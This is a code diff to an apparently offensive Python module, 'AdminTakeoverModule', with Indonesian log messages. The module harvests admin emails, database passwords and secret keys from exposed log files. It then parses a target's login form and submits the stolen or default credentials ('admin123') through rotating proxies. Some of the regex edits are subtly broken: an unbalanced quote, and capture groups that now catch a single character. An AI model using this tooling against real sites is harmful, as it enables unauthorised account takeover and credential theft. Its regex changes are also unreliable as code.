@@ -50,11 +50,11 @@ class AdminTakeoverModule(BaseModule):
                 with open(full_path, "r", encoding="utf-8") as f:
                     log_content = f.read()
                 
-                email_match = re.search(r'(?:ADMIN_EMAIL|email|user|username)\s*=\s*[\'"]?([^\'"\s]+)', log_content, re.IGNORECASE)
+                email_match = re.search(r'(?:ADMIN_EMAIL|email|user|username)\s*=\s*[\'"']?([^\'"'\s]+)', log_content, re.IGNORECASE)
                 if email_match:
                     self.extracted_credentials["identity_payload"] = email_match.group(1)
 
-                pass_match = re.search(r'(?:DB_PASSWORD|password|passwd|SECRET_KEY)\s*=\s*[\'"]?([^\'"\s]+)', log_content, re.IGNORECASE)
+                pass_match = re.search(r'(?:DB_PASSWORD|password|passwd|SECRET_KEY)\s*=\s*[\'"']?([^\'"'\s]+)', log_content, re.IGNORECASE)
                 if pass_match:
                     self.extracted_credentials["password"] = pass_match.group(1)
                     print(f"\033[1;35m[+] Takeover Engine V18.3: Memanen Kredensial -> {self.extracted_credentials['identity_payload']}:{self.extracted_credentials['password']}\033[0m")
@@ -69,8 +69,8 @@ class AdminTakeoverModule(BaseModule):
 
         input_tags = re.findall(r'<input[^>]*>', html_content, re.IGNORECASE)
         for tag in input_tags:
-            name_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
-            type_match = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
+            name_match = re.search(r'name=["\']([^"\'])+["\']', tag, re.IGNORECASE)
+            type_match = re.search(r'type=["\']([^"\'])+["\']', tag, re.IGNORECASE)
             
             if name_match:
                 name_val = name_match.group(1).lower()
@@ -84,7 +84,7 @@ class AdminTakeoverModule(BaseModule):
                         
         for tag in input_tags:
             type_match = re.search(r'type=["\']password["\']', tag, re.IGNORECASE)
-            name_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
+            name_match = re.search(r'name=["\']([^"\'])+["\']', tag, re.IGNORECASE)
             if type_match and name_match:
                 password_field_name = name_match.group(1)
                 print(f"[*] Takeover Engine V18.3: Form Context Found! Password Field -> '{password_field_name}'")
@@ -97,11 +97,12 @@ class AdminTakeoverModule(BaseModule):
         if not self.extracted_credentials["password"]:
             self.extracted_credentials["password"] = "admin123"
 
-        headers = self.auditor._get_random_headers()
+        headers = await self.auditor._get_random_headers()  # FIX: Added await
         
         try:
             print(f"[*] Menyelidiki struktur form halaman target murni -> {login_url}")
-            async with session.get(login_url, headers=headers, timeout=config.TIMEOUT, proxy=self.auditor._get_random_proxy()) as pre_res:
+            proxy = await self.auditor._get_random_proxy()  # FIX: Added await
+            async with session.get(login_url, headers=headers, timeout=config.TIMEOUT, proxy=proxy) as pre_res:
                 form_html = await pre_res.text()
             
             id_field, pass_field = self.parse_login_form_context(form_html)
@@ -114,7 +115,8 @@ class AdminTakeoverModule(BaseModule):
             }
 
             print(f"[*] Menembak gerbang otentikasi secara murni (100% Clean URL) -> {login_url}")
-            async with session.post(login_url, data=login_payload, headers=headers, timeout=config.TIMEOUT, proxy=self.auditor._get_random_proxy(), allow_redirects=True) as res:
+            proxy = await self.auditor._get_random_proxy()  # FIX: Added await
+            async with session.post(login_url, data=login_payload, headers=headers, timeout=config.TIMEOUT, proxy=proxy, allow_redirects=True) as res:
                 body = await res.text()
                 status = res.status
 
